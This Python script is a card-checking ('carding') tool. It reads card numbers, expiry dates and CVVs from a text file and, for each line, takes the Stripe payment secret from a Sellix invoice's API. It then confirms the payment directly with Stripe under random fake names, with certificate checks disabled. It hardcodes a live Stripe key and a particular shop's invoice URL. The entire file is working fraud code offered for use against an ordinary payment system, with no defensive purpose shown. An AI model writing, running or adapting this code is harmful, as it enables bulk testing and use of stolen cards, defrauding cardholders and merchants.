import requests
import urllib3
import random
import re
import logging

urllib3.disable_warnings()

def extract_invoice_info(url):
    match = re.match(r'https?://([a-zA-Z0-9.-]+)/(?:[a-zA-Z0-9.-]+/)?invoice/([^/]+)', url)
    if match:
        groups = match.groups()
        return {
            'domain': groups[0], 
            'invoice_id': groups[1]
        }
    else:
        return {
            "error": "Error: Invalid Sellix Invoice URL."
            }

def sellix_info(url):
    url_info = extract_invoice_info(url)

    if url_info.get("error"):
        return url_info
    invoice_id = url_info["invoice_id"]
    domain = url_info["domain"]

    url = f"https://{domain}/api/shop/invoices/{invoice_id}"

    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
    }
    try:
        r = requests.get(url, headers=headers, verify=False)

        if r.status_code != 200:
            return {
                "error": "Error Code: " + str(r.status_code)
            }
        if r.json().get("error"):
            return {
                "error": r.json()["error"]
            }
        info = r.json()["data"]["invoice"]
        data = {
            "domain": domain,
            "invoice_id": invoice_id,
            "email": info.get("customer_email"),
            "pi": info.get("stripe_client_secret"),
            "pk": "pk_live_51JpGudGGvSAAHahB4rQbESNBf5Lm7bUOBLfpzqbithD4MTr9zhWN1SUx134s7MLODCj11W7Y1S7mqrT8iUjdoPah00gksKbsKb" if info.get("stripe_publishable_key") in [None, ""] else info.get("stripe_publishable_key"),
            "acc_id": info.get("stripe_user_id")
        }
        return data
    except Exception as e:
        return {
            "error": "Error: " + str(e)
        }

def random_info():
    f = ["Henry", "Charlie", "James", "Chris", "Robert"]
    l = ["Downy", "Johansson", "Smith", "Grey"]
    return {
        "first_name": random.choice(f),
        "last_name": random.choice(l)
    }

def pay_sellix(filename="BAT.txt"):
    try:
        with open(filename, "r") as f:
            cc_data = f.readlines()
    except FileNotFoundError:
        return {
            "error": f"Error: File '{filename}' not found."
        }
    except Exception as e:
        return {
            "error": f"Error while reading the file: {e}"
        }

    for line in cc_data:
        cc_info = line.strip().split("|")
        if len(cc_info) == 4:
            ccn, mon, year, cvv = cc_info
            result = pay_sellix_single(ccn, mon, year, cvv)
            print(result)

def pay_sellix_single(ccn, mon, year, cvv):
    sellix_url = "https://civilmdc.mysellix.io/invoice/7ff8a0-2e0f7ddcc0-bebc99"  # Replace with your Sellix URL
    result = pay_sellix_request(sellix_url, ccn, mon, year, cvv)
    return result

def pay_sellix_request(url, ccn, mon, year, cvv):
    sellix_info_result = sellix_info(url)
    if sellix_info_result.get("error"):
        return {
            "error": sellix_info_result["error"]
        }
    domain = sellix_info_result["domain"]
    invoice_id = sellix_info_result["invoice_id"]
    pi_id = "pi_" + sellix_info_result["pi"].split("_")[1]
    cs_id = "secret_" + sellix_info_result["pi"].split("_")[3]
    acc_id = sellix_info_result["acc_id"]
    pk = sellix_info_result["pk"]
    email = sellix_info_result["email"]

    rn_info = random_info()
    first_name = rn_info["first_name"]
    last_name = rn_info["last_name"]

    url_confirm = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
    headers_confirm = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "referer": "https://js.stripe.com/",
    }
    data_confirm = f"return_url=https%3A%2F%2F{domain}%2Finvoice%2F{invoice_id}&payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={year}&payment_method_data[card][exp_month]={mon}&payment_method_data[billing_details][address][country]=IN&payment_method_data[payment_user_agent]=stripe.js%2Fefee6eb491%3B+stripe-js-v3%2Fefee6eb491%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2F{domain}&payment_method_data[time_on_page]=10585&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&_stripe_account={acc_id}&client_secret={pi_id}_{cs_id}"

    try:
        r_confirm = requests.post(url_confirm, headers=headers_confirm, data=data_confirm, verify=False)

        if r_confirm.status_code == 200 and r_confirm.json().get("status") == "succeeded":
            logging.info("Payment succeeded for invoice_id: %s", invoice_id)
            return True
        elif r_confirm.json().get("error"):
            if r_confirm.json()["error"]["type"] == "invalid_request_error":
                return {
                    "error": f"Error: Expired Invoice for invoice_id {invoice_id}."
                }
            else:
                return {
                    "error": f"Error: {r_confirm.json()['error']['message']} for invoice_id {invoice_id}."
                }
        elif r_confirm.status_code == 200 and r_confirm.json().get("status") == "requires_action":
            logging.info("Payment requires action for invoice_id: %s", invoice_id)
            three_d_secure_2_source = r_confirm.json()["next_action"]["use_stripe_sdk"]["three_d_secure_2_source"]
            # ... (additional code if needed)
        elif r_confirm.status_code != 200:
            logging.error("Unexpected status code %s for invoice_id: %s", r_confirm.status_code, invoice_id)
            # ... (additional code if needed)
        else:
            logging.error("Unknown status for invoice_id: %s", invoice_id)
            # ... (additional code if needed)

    except Exception as e:
        logging.error("Error occurred during payment for invoice_id %s: %s", invoice_id, str(e))
        # ... (additional code if needed)

    return {
        "error": "Error: Unknown Error"
    }

# Example usage
pay_sellix()  # This will read from "filename.txt" and attempt payments for each line in the file

